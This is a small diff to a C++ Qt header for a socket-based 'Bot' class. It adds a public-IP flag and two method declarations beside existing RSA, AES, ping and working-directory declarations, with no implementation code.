@@ -23,7 +23,7 @@ class Bot : public QTcpSocket
         ~Bot();
 
         bool operator < (const Bot &bot) { return this->socketDescriptor() < bot.socketDescriptor(); }
-
+        bool hasWhiteIp;
         QByteArray getCWD();
 
     private:
@@ -44,6 +44,7 @@ class Bot : public QTcpSocket
         void initRSA();
         QByteArray decryptRSA(QByteArray);
 
+        void checkForWhiteIp();
 
     signals:
         void deleteMe(Bot*);
@@ -57,6 +58,7 @@ class Bot : public QTcpSocket
         void initAES();
         void timeToPing();
         void timeToDisconnect();
+        void setWhiteIp();
 };
 
 #endif // BOT_H
